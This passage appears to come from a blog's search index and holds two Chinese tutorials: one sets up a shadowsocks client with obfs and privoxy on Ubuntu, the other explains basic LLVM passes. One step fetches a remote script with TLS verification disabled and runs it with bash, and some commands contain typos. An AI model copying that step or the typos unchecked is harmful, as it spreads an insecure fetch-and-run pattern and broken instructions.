        <category>Attack</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>bugs</tag>
        <tag>attack</tag>
      </tags>
  </entry>
  <entry>
    <title>ss and obfs Configuration in Ubuntu 18.04</title>
    <url>/2020/02/26/ss-ubuntu/</url>
    <content><![CDATA[<p>本文详细介绍了如何在 Ubuntu 上进行 ss 配置并引入 obfs 来科学上网。</p>
<a id="more"></a>

<h2 id="SS-Server"><a href="#SS-Server" class="headerlink" title="SS Server"></a>SS Server</h2><p>此处我使用的是两种方法：白嫖和购买。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9tYy1saXVsaS50b3Av" title="https://mc-liuli.top/">白嫖<i class="fa fa-external-link"></i></span>是无奈之举，突然被墙之后，只能找到白嫖网站续命。当然白嫖的是有流量限制和速度控制的，不能够满足正常的需要，且每天打卡和时不时的无法上网也是硬伤。</p>
<p>上面的这个白嫖地点我是从知乎找到的，建议下次碰到服务器被 wall 之后，若暂时需要代理，可以去知乎上找较为新的帖子。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9qdXN0bXlzb2Nrcy5uZXQvbWVtYmVycy9jbGllbnRhcmVhLnBocA==" title="https://justmysocks.net/members/clientarea.php">购买<i class="fa fa-external-link"></i></span>的地址我也是百度获取的，一开始尝试了 Express VPN，但是效果奇差无比，基本他们提供的服务器都无法访问。因此在找了一系列相关的资料之后，发现主要的可以快速上网的方式有两个：购买境外服务器自行配置 SS Server，或者是直接购买  Just My Socks。</p>
<p>我使用的是后者，因为我目前仅仅需要科学上网，还没有建站的需求。后续如果涉及建站可能会考虑自行搭建。网上也有<span class="exturl" data-url="aHR0cHM6Ly93d3cud2VydnBzLmNvbS8=" title="https://www.wervps.com/">相应的教程<i class="fa fa-external-link"></i></span>。</p>
<p>购买了 Just My Socks 之后，会得到相应的 ss 信息，由于目前<strong>对于仅采用 ss 的代理服务</strong>，wall 的特别厉害，因此我自己体验下来，只有采用 obfs 的 ss 方式速度才能够接受。</p>
<p>因此为了能够在 ubuntu 上使用 ss 且有 obfs 支持，所以特意费了一番功夫，找到了 shadowsocks-libv + simple-obfs 的方法。Mac 和 Windows 的 ss 客户端做的很好，而且如果要使用 simple-obfs 的话，只需要下载相应的文件即可。</p>
<h2 id="SS-客户端安装和配置"><a href="#SS-客户端安装和配置" class="headerlink" title="SS 客户端安装和配置"></a>SS 客户端安装和配置</h2><p>Ubuntu 安装 SS 的指令非常简单。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo apt update</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo apt install shadowsocks-libev</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo vim /etc/shadowsocks/config.json</span></span><br></pre></td></tr></table></figure>

<p>在 config.json 中写入如下信息</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;                                       </span><br><span class="line">    <span class="attr">"server"</span>:<span class="string">"0.0.0.0"</span>,</span><br><span class="line">    <span class="attr">"server_port"</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">"local_address"</span>: <span class="string">"127.0.0.1"</span>,</span><br><span class="line">    <span class="attr">"local_port"</span>:<span class="number">1088</span>,</span><br><span class="line">    <span class="attr">"password"</span>:<span class="string">""</span>,</span><br><span class="line">    <span class="attr">"timeout"</span>: <span class="number">300</span>,</span><br><span class="line">    <span class="attr">"method"</span>:<span class="string">""</span>,</span><br><span class="line">    <span class="attr">"fast_open"</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">"workers"</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">"prefer_ipv6"</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">"plugin"</span>:<span class="string">""</span>,</span><br><span class="line">    <span class="attr">"plugin_opts"</span>:<span class="string">""</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中，<code>server</code>、<code>server_port</code>、<code>password</code>、<code>method</code> 这些 key 的值在购买服务器的时候都已经给你了，当然如果要自己配置服务器的话，在 server 端已经配置好了。其他的可以参照默认配置，除了 <code>plugin</code> 和 <code>plugin-opts</code> 这两个 key，这是之后配置 obfs 的时候设置的。</p>
<p>这样一来 SS 客户端的连接配置文件就配置好了，接下来我们设置以下该系统服务的启动配置，使得连接的时候使用我们刚刚编写的文件。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo vim /lib/systemd/system/shadowsocks-libev-local@.service</span></span><br></pre></td></tr></table></figure>

<p>在文件当中找到 <code>ExecStart</code> 配置项，修改为我们刚刚创建的配置文件路径</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ExecStart&#x3D;&#x2F;usr&#x2F;bin&#x2F;ss-local -c &#x2F;etc&#x2F;shadowsocks&#x2F;config.json</span><br></pre></td></tr></table></figure>

<p>接下来是启动、查看状态还有停止服务，当然还有设置开机启动。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 启动</span></span><br><span class="line">sudo systemctl start shadowsocks-libev-local@.</span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看运行情况</span></span><br><span class="line">sudo systemctl status shadowsocks-libev-local@.</span><br><span class="line"><span class="meta">#</span><span class="bash"> 停止</span></span><br><span class="line">sudo systemctl stop shadowsocks-libv-local@.</span><br><span class="line"><span class="meta">#</span><span class="bash"> 配置开机自启</span></span><br><span class="line">sudo systemctl enable shadowsocks-libev-local@.</span><br></pre></td></tr></table></figure>



<h2 id="Obfs-插件配置"><a href="#Obfs-插件配置" class="headerlink" title="Obfs 插件配置"></a>Obfs 插件配置</h2><p>加入 obfs 插件的方法很简单，使用包管理器下载，并引入安装路径即可。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo apt install simple-obfs</span></span><br></pre></td></tr></table></figure>

<p>如果不知道默认的安装路径，可以运行 <code>dpkg -L &lt;name&gt;</code> 来查找 obfs 包安装的位置</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> dpkg -L simple-obfs</span></span><br><span class="line">...</span><br><span class="line">/usr/bin/obfs-local</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>找到 <code>obfs-local</code> 的路径，回到之前编辑的 ss-local 配置文件当中，填写相关的 value</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo vim /etc/shadowsocks/config.json</span></span><br></pre></td></tr></table></figure>

<p>填写</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&#123;                                       </span><br><span class="line">    ...</span><br><span class="line">    "plugin":"/usr/bin/obfs-local",</span><br><span class="line">    "plugin_opts":"obfs=tls"</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当然这里的参数需要根据购买服务器得到的信息来填写。</p>
<p>最后重启 ss-local 客户端即可。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo systemctl restart shadowsocks-libev-local@.</span></span><br></pre></td></tr></table></figure>

<p>可以通过 <code>netstat -lpnut</code> 来查看开放的端口，如果运行正常此时之前设置的 <code>1088</code> 端口肯定是被占用的。</p>
<h2 id="Privoxy-配置"><a href="#Privoxy-配置" class="headerlink" title="Privoxy 配置"></a>Privoxy 配置</h2><p>我们之前配置好的 ss 客户端，可以用 chrome 的 proxy switch omega 插件来配置自动切换代理，但是对于非浏览器的程序，尤其是使用频繁的 terminal 中的进程，很多就无法通过 socks5 协议来实现代理。这个时候就需要 privoxy 这个软件来把所有 http/https 的数据包转为 socks5 来传输。</p>
<p>我推荐使用的是 PAC 模式，即在 gfw 名单中的域名使用代理。全局模式我就不介绍了，因为 Google 也搜得到。</p>
<p>首先是安装 privoxy。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo apt install privoxy</span></span><br></pre></td></tr></table></figure>

<p>然后使用 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3pmbDkvZ2Z3bGlzdDJwcml2b3h5" title="https://github.com/zfl9/gfwlist2privoxy">gfwlist2privoxy<i class="fa fa-external-link"></i></span> 工具来生成 pac 列表。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> curl -4sSkLO https://raw.github.com/zfl9/gfwlist2privoxy/master/gfwlist2privoxy</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 注意将 127.0.0.1:1080 替换为你的 socks5 地址</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> bash gfwlist2privoxy 127.0.0.1:1080</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> mv -f gfwlist.action /etc/privoxy/</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 这一步可能会报错说权限不够，可以改成 sudo vim 来手动输入</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> <span class="string">'actionsfile gfwlist.action'</span> &gt;&gt; /etc/privoxy/config</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> systemctl restart privoxy.service</span></span><br></pre></td></tr></table></figure>

<p>这样一来，privoxy 就会监听默认的 <code>8118</code> 端口，并把 http/https 的数据包转换为 socks5 并转发到 ss-local。</p>
<p>注意 privoxy 的监听端口也是可以设置的，就在之前设置的 <code>/etc/privoxy/config</code>，改动下面两行即可，可以参照注释来修改。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">listen-address  127.0.0.1:8118</span><br><span class="line">listen-address  [::1]:8118</span><br></pre></td></tr></table></figure>

<ul>
<li>注意，在配置完 privoxy 并重启服务之后，还需要手动设置 terminal 中的环境变量来实现代理。</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">export</span> http_proxy=<span class="string">'http://127.0.0.1:8118'</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">export</span> https_proxy=<span class="string">'http://127.0.0.1:8118'</span></span></span><br></pre></td></tr></table></figure>

<p>当然，也可以编写 shell code，然后用 <code>source</code> 命令来使他们生效。</p>
<p>至此为止，所有的工作都已经完成。感谢机智 programmers 的帮助。</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ol>
<li><span class="exturl" data-url="aHR0cHM6Ly9sZWFybmt1LmNvbS9hcnRpY2xlcy8yOTE1Mg==" title="https://learnku.com/articles/29152">Mac 使用 privoxy 和 sock5 加速终端 /docker 完全指南<i class="fa fa-external-link"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9qdWVqaW4uaW0vcG9zdC81YzkxZmY1ZWU1MWQ0NTM0NDQ2ZWRiOWE=" title="https://juejin.im/post/5c91ff5ee51d4534446edb9a">polipo/privoxy 实现 Linux 系统全局/自动代理<i class="fa fa-external-link"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9pdC5pc215LmZ1bi8yMDE5LzAzLzE0L3ByaXZveHkv" title="https://it.ismy.fun/2019/03/14/privoxy/">Privoxy 配置<i class="fa fa-external-link"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3pmbDkvZ2Z3bGlzdDJwcml2b3h5" title="https://github.com/zfl9/gfwlist2privoxy">适用于 privoxy 的 gfwlist.pac<i class="fa fa-external-link"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuemZsOS5jb20vc3MtbG9jYWwuaHRtbA==" title="https://www.zfl9.com/ss-local.html">pss-local 配置<i class="fa fa-external-link"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuemZsOS5jb20vc3MtcmVkaXIuaHRtbA==" title="https://www.zfl9.com/ss-redir.html">ss/ssr/v2ray/socks5 透明代理<i class="fa fa-external-link"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmFoYW8ubW9lL3Bvc3RzL211bHRpX3VzZXJfb2Zfc2hhZG93c29ja3NfbGliZXYuaHRtbA==" title="https://blog.ahao.moe/posts/multi_user_of_shadowsocks_libev.html">基于ss-libev+simple-obfs的单机多用户搭建<i class="fa fa-external-link"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NoYWRvd3NvY2tzL3NoYWRvd3NvY2tzLXdpbmRvd3MvaXNzdWVzLzI1Nzk=" title="https://github.com/shadowsocks/shadowsocks-windows/issues/2579">obfs安装过程<i class="fa fa-external-link"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuc29sYXJjay5jb20vc2hhZG93c29ja3MtbGliZXYuaHRtbA==" title="https://www.solarck.com/shadowsocks-libev.html">VPS 搭梯子指南——shadowsocks+BBR+obfs<i class="fa fa-external-link"></i></span></li>
<li><span class="exturl" data-url="aHR0cDovL2NsYXVkZS1yYXkuY29tLzIwMTgvMTIvMDEvc3MtbG9jYWwv" title="http://claude-ray.com/2018/12/01/ss-local/">Ubuntu配置ss-local客户端<i class="fa fa-external-link"></i></span></li>
</ol>
]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>ss</tag>
        <tag>obfs</tag>
      </tags>
  </entry>
  <entry>
    <title>Write a LLVM Pass</title>
    <url>/2020/02/09/LLVM-Pass/</url>
    <content><![CDATA[<p>如何写一个简单的 LLVM Pass，并编译和运行该 Pass，这篇文章给出了简要介绍。包括 LLVM 官网的 Hello Pass，指令操作数统计和循环内 basic block 统计。</p>
<a id="more"></a>

<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p><strong>LLVM Pass</strong> 是 LLVM 项目中很重要的一个部分。当我们使用 <code>clang -c -emit-llvm</code> 指令将 C/C++ 代码编译成 LLVM IR 之后，该如何利用这些 bitcode 呢？就轮到 Pass 出场了。</p>
<p>在我的理解里，LLVM Pass 其实是一个 C++ 的类，即 <code>class Pass {}</code>。我们写的 Pass 就继承于 LLVM 自带的一些 Passes，比如 <span class="exturl" data-url="aHR0cHM6Ly9sbHZtLm9yZy9kb2NzL1dyaXRpbmdBbkxMVk1QYXNzLmh0bWwjd3JpdGluZy1hbi1sbHZtLXBhc3MtbW9kdWxlcGFzcw==" title="https://llvm.org/docs/WritingAnLLVMPass.html#writing-an-llvm-pass-modulepass">ModulePass<i class="fa fa-external-link"></i></span> 或者是 <span class="exturl" data-url="aHR0cHM6Ly9sbHZtLm9yZy9kb2NzL1dyaXRpbmdBbkxMVk1QYXNzLmh0bWwjd3JpdGluZy1hbi1sbHZtLXBhc3MtZnVuY3Rpb25wYXNz" title="https://llvm.org/docs/WritingAnLLVMPass.html#writing-an-llvm-pass-functionpass">FunctionPass<i class="fa fa-external-link"></i></span>。简单来讲，之所以叫做 Pass，是因为在运行它的时候，Pass 会按照<strong>特定的结构</strong>进行遍历。以 FunctionPass 为例，如果我们写的 Pass 继承 FunctionPass 类，那么在运行该 Pass 时会按照 LLVM IR 中的每个函数进行遍历，我们可以针对每个函数进行操作，比如获取该函数的名称（如下文讲到的 HelloPass）。</p>
<p>要运行 LLVM Pass，必须要获取 LLVM IR，同时也需要相应的 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2xsdm0vbGx2bS1wcm9qZWN0LmdpdA==" title="https://github.com/llvm/llvm-project.git">LLVM Source Code<i class="fa fa-external-link"></i></span>，这里需要指出的是，<strong>如果采用编译 Pass 的方法是依赖于 LLVM Source Code 的，那么需要将该 Source Code 编译并安装一遍，再添加我们自己写的 Pass 目录和文件，否则会出现缺失头文件无法编译的情况。</strong></p>
<p>如果是外部编译，也可能出现类似的问题，可能可以尝试用编译安装 LLVM Source Code 的方法解决。</p>
<p>文章后续介绍的 Pass 编译方法都是依赖于 Source Code 的，如果想要尝试外部编译，可以参考 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RpYW55dXpob3U5NS9sbHZtLXR1dG9y" title="https://github.com/tianyuzhou95/llvm-tutor">llvm-tutor<i class="fa fa-external-link"></i></span> 这个项目。</p>
<h2 id="Hello-Pass"><a href="#Hello-Pass" class="headerlink" title="Hello Pass"></a>Hello Pass</h2><p>由于是第一个 Pass，因此对于项目构建进行较为详细的说明。</p>
<p>参考官网的<span class="exturl" data-url="aHR0cHM6Ly9sbHZtLm9yZy9kb2NzL0dldHRpbmdTdGFydGVkLmh0bWw=" title="https://llvm.org/docs/GettingStarted.html">构建说明<i class="fa fa-external-link"></i></span>，在下载、编译并安装 LLVM 最新的版本之后（我使用的是 LLVM 11），我们再回到LLVM Source Code 目录下。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">llvm-project&#x2F;</span><br><span class="line">├── build&#x2F;</span><br><span class="line">...</span><br><span class="line">├── llvm&#x2F;</span><br><span class="line">└── pstl&#x2F;</span><br></pre></td></tr></table></figure>

<p>这里我省略了部分文件夹，找到 Source Code 根目录下的 <code>llvm/</code> 目录，我们需要在 <code>llvm-project/llvm/lib/Transforms/</code> 目录下新建目录 <code>TestHello/</code>，名字自取，当然由于已经存在了 <code>Hello/</code>  目录，因而不可以重名。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">llvm-project&#x2F;</span><br><span class="line">   ├── llvm&#x2F;</span><br><span class="line">      ├── lib&#x2F;</span><br><span class="line">         ├── Transforms&#x2F;</span><br><span class="line">            ├── CMakeLists.txt</span><br><span class="line">            ├── TestHello&#x2F;</span><br><span class="line">               ├── hello_test.cpp</span><br><span class="line">               └── CMakeLists.txt</span><br></pre></td></tr></table></figure>

<p>主要文件和目录的结构如上图所示，我们需要新建的有目录 <code>TestHello/</code>，C++ 文件 <code>hello_test.cpp</code> 和 cmake 构建信息 <code>CMakeLists.txt</code>。同时上级目录 <code>Transforms/</code> 中的  <code>CMakeLists.txt</code> 也需要改动。</p>
<p>首先是 <code>hello_test.cpp</code> 中的内容<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RpYW55dXpob3U5NS9sbHZtLXByb2plY3QvYmxvYi9tYXN0ZXIvbGx2bS9saWIvVHJhbnNmb3Jtcy9UZXN0UGFzcy9UZXN0UGFzcy5jcHA=" title="https://github.com/tianyuzhou95/llvm-project/blob/master/llvm/lib/Transforms/TestPass/TestPass.cpp">（参考 GitHub）<i class="fa fa-external-link"></i></span>。</p>
<p>我将逐一讲述每个部分代码的意义，稍显冗长但是因为是第一次构建所以还是有必要的。</p>
<p>首先是 namespace 的使用。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> llvm;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里因为是编写 LLVM Pass，所以使用的 namespace 为 llvm，可以看到后续的代码都置于一个匿名 namespace 中，目的是编写的这些代码仅仅能够在该文件当中才能运行，实现了较好的隔离性，除该文件外的任何代码都无法访问到该匿名空间内的所有函数和变量。</p>
<p>接下来看 namespace 中定义的结构和函数。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TestPass</span> :</span> <span class="keyword">public</span> FunctionPass &#123;</span><br></pre></td></tr></table></figure>

<p>我们定义的 Pass 的名称为 TestPass，继承自 FunctionPass 类，当然这里的 <code>public</code> 是为了编程规范，因为 c++ struct 默认的继承就是公有继承。FunctionPass 的特点是按照 LLVM IR 中的函数进行遍历，每次操纵的对象都是单个函数。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> ID;</span><br><span class="line">TestPass() : FunctionPass(ID) &#123;&#125;</span><br></pre></td></tr></table></figure>

<p>在结构体中需要定义一个 <code>static char ID</code> 变量，同时在构造函数中套用 FunctionPass 的构造函数进行初始化。这个 <code>ID</code> 是所有 Pass 都具有的标识符，因此每次编写 Pass 的时候都需要。</p>
<p>由于没有其他的结构变量，所以在这里不需要对构造函数进行改动。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">runOnFunction</span><span class="params">(Function &amp;F)</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">    errs() &lt;&lt; <span class="string">"TestPass: "</span>;</span><br><span class="line">    errs().write_escaped(F.getName()) &lt;&lt; <span class="string">'\n'</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的 <code>runOnFunction()</code> 函数是本次 Pass 的<span class="exturl" data-url="aHR0cHM6Ly9sbHZtLm9yZy9kb3h5Z2VuL2NsYXNzbGx2bV8xXzFMUFBhc3NNYW5hZ2VyLmh0bWwjYTMyNTViMGIzYWI3OWFkMGQxYjkzY2UzZGE2NzVmMjQw" title="https://llvm.org/doxygen/classllvm_1_1LPPassManager.html#a3255b0b3ab79ad0d1b93ce3da675f240">核心函数<i class="fa fa-external-link"></i></span>，是 FunctionPass 提供的虚函数接口，它会在 <span class="exturl" data-url="aHR0cHM6Ly9sbHZtLm9yZy9kb3h5Z2VuL2dyb3VwX19MTFZNQ0NvcmVQYXNzTWFuYWdlcnMuaHRtbA==" title="https://llvm.org/doxygen/group__LLVMCCorePassManagers.html">LLVM Pass Manager<i class="fa fa-external-link"></i></span> 遍历每个函数的时候调用。</p>
<p>在这里我们做的操作很简单，就是将函数名称打印在标准错误输出上，即显示在 terminal 中。</p>
<p>这里的返回值为 <code>false</code>，因为我们没有对 LLVM IR 做任何的改动，如果我们编写的 Pass 改写了 IR，那么就需要返回 <code>true</code>。</p>
<p>接下来后续的 Pass 会对这里的函数引用 <code>Function &amp;F</code> 做更多的操作，更多的函数参考 LLVM 官方文档即可，我的经验是 Google 就行。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> TestPass::ID = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> RegisterPass&lt;TestPass&gt; <span class="title">X</span><span class="params">(<span class="string">"testpass"</span>, <span class="string">"Hello Test Pass"</span>, <span class="literal">false</span>, <span class="literal">true</span>)</span></span>;</span><br></pre></td></tr></table></figure>

<p>这段是将我们编写的 Pass 初始化，并注册到 LLVM 的 Pass 集合中，这里有四个参数，第一个参数是命令行调用该 Pass 时的参数，在后续的运行指令中可以看到；第二个参数是 <code>--help</code> 时打印的参数说明。</p>
<blockquote>
<p>The last two arguments describe its behavior: if a pass walks CFG without modifying it then the third argument is set to <code>true</code>; if a pass is an analysis pass, for example dominator tree pass, then <code>true</code> is supplied as the fourth argument.</p>
</blockquote>
<p>后两个参数是有关 CFG 改动和 Analysis Pass 的，在这里不作过多说明，详细的可以参照<span class="exturl" data-url="aHR0cHM6Ly9sbHZtLm9yZy9kb2NzL1dyaXRpbmdBbkxMVk1QYXNzLmh0bWw=" title="https://llvm.org/docs/WritingAnLLVMPass.html">官网<i class="fa fa-external-link"></i></span>。</p>
<p><strong>这些 code 是必不可少的</strong>，每一个 Pass 都需要做这些。</p>
<p>接下来的 <code>RegisterStandardPasses</code> 部分是<strong>可选的</strong>，一般我们都放上，可以更快的调用该 Pass。</p>
<p>写完了 <code>hello_test.cpp</code>，我们开始编写同目录下的 <code>CMakeLists.txt</code>。</p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">add_llvm_library( LLVMHelloTestPass MODULE</span><br><span class="line">  hello_testcpp</span><br><span class="line"></span><br><span class="line">  PLUGIN_TOOL</span><br><span class="line">  opt</span><br><span class="line">  )</span><br></pre></td></tr></table></figure>

<p>大概的介绍下就是将该 cpp 文件添加到 LLVM 的构建项目中，从而使得在编译 LLVM Project 的时候可以编译该 Pass。</p>
<p>由于添加了这个新的目录，因此在上级目录的 <code>CMakeLists.txt</code> 中同样需要做出改动。</p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="keyword">add_subdirectory</span>(Utils)</span><br><span class="line">...</span><br><span class="line"><span class="keyword">add_subdirectory</span>(TestHello)</span><br></pre></td></tr></table></figure>

<p>需要在文件中增加一行 <code>add_subdirectory(${your/dir/name})</code> 加上新添加的目录名称。</p>
<p>全部做完之后，再回到之前编译 LLVM 时建立的 <code>build/</code> 目录下，使用当时构建的工具再构建一次并安装相应的库即可。之后我们就会在安装目录下找到一个新的动态链接库，如果是 Linux 的系统中，那么是以 <code>.so</code> 结尾，Mac OS 中是以 <code>.dylib</code> 结尾。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ls /your/llvm/install/path/lib/*.dylib</span></span><br><span class="line">/your/llvm/install/path/lib/LLVMHelloTestPass.dylib</span><br></pre></td></tr></table></figure>

<p>有了这个动态链接库，就可以在 LLVM 上跑我们写的 Hello Pass 了。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> opt -load /your/llvm/install/path/lib/LLVMHelloTestPass.dylib --testpass -<span class="built_in">disable</span>-output main.ll</span></span><br><span class="line">TestPass: add</span><br><span class="line">TestPass: minus</span><br><span class="line">TestPass: multiply</span><br><span class="line">TestPass: divide</span><br><span class="line">TestPass: main</span><br></pre></td></tr></table></figure>

<p>这里的 <code>--testpass</code> 参数可以用 <code>--help</code> 找到。<code>-disable-output</code> 是用来避免输出 bitcode 的。</p>
<p>同时还可以使用 <code>--debug-pass=Structure</code> 来看调用了哪些 LLVM 组建，具体的参数还是去 LLVM 官网上搜索为好。</p>
<p>至此一个基本的 LLVM Pass 就已经介绍完毕了，包括从构建到编译运行的一系列过程。</p>
<h2 id="CountOpPass-Basic-Block"><a href="#CountOpPass-Basic-Block" class="headerlink" title="CountOpPass - Basic Block"></a>CountOpPass - Basic Block</h2><p>之前介绍过的基本的 Pass 的概念就不作赘述了，这里就简单的介绍一下操作数统计的 Pass。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">runOnFunction</span><span class="params">(Function &amp;F)</span> </span>&#123;</span><br><span class="line">    errs() &lt;&lt; <span class="string">"Function "</span> &lt;&lt; F.getName() &lt;&lt; <span class="string">"\n"</span>;</span><br><span class="line">    <span class="keyword">for</span> (Function::iterator bb = F.<span class="built_in">begin</span>(), e = F.<span class="built_in">end</span>(); bb != e; bb++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (BasicBlock::iterator i = bb-&gt;<span class="built_in">begin</span>(), ei = bb-&gt;<span class="built_in">end</span>(); i != ei; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (opCounter.<span class="built_in">find</span>(i-&gt;getOpcodeName()) == opCounter.<span class="built_in">end</span>()) &#123;</span><br><span class="line">                <span class="comment">// not record, so insert an entry</span></span><br><span class="line">                opCounter[i-&gt;getOpcodeName()] = <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// add num</span></span><br><span class="line">                opCounter[i-&gt;getOpcodeName()] += <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// go through and print</span></span><br></pre></td></tr></table></figure>

<p>之所以想在这里介绍这个 Pass，是因为想引入 <span class="exturl" data-url="aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvQmFzaWNfYmxvY2s=" title="https://en.wikipedia.org/wiki/Basic_block">Basic Blocks<i class="fa fa-external-link"></i></span> 这个概念。在可读的 LLVM IR 中我们可以发现，所有代码都是按照 instruction -&gt; basic block -&gt; function -&gt; module 的顺序来组织的。指令很好理解，这个 basic block 就是一段顺序执行指令的最大子集。举个例子，如果一个函数当中存在 if/else 语句，那么在 LLVM IR 中，从函数开始到 if 语句判断，就是第一个 basic block。basic block 当中所有的指令都是顺序执行的。</p>
<p>在上述代码中可以看到，利用 <code>Function &amp;F</code> 遍历函数内部的每一个 basic block，再在 basic block 中遍历每一条 instruction，从而得到了操作数的统计。</p>
<h2 id="LoopBBCountPass-getAnalysisUsage"><a href="#LoopBBCountPass-getAnalysisUsage" class="headerlink" title="LoopBBCountPass - getAnalysisUsage"></a>LoopBBCountPass - getAnalysisUsage</h2><p>这个 Pass 计算了每个 loop 中 basic block 的数目。</p>
<p>之所以要引入这个 Pass，是因为它使用了其他的 Pass 来辅助分析。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getAnalysisUsage</span><span class="params">(AnalysisUsage &amp;AU)</span> <span class="keyword">const</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">    AU.addRequired&lt;LoopInfoWrapperPass&gt;();</span><br><span class="line">    AU.setPreservesAll();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当我们自己编写的 Pass 需要引入其他 Pass 时，必须如上述代码所示，使用 <code>getAnalysisUsage()</code> 来引入需要的 Pass，这里引入的是 LoopInfoWrapperPass，借助它可以获取函数当中循环体的信息。</p>
<p>关于 getAnalysis 的信息，<span class="exturl" data-url="aHR0cHM6Ly9sbHZtLm9yZy9kb2NzL1dyaXRpbmdBbkxMVk1QYXNzLmh0bWwjZXhhbXBsZS1pbXBsZW1lbnRhdGlvbnMtb2YtZ2V0YW5hbHlzaXN1c2FnZQ==" title="https://llvm.org/docs/WritingAnLLVMPass.html#example-implementations-of-getanalysisusage">官网<i class="fa fa-external-link"></i></span>也给出了例子。</p>
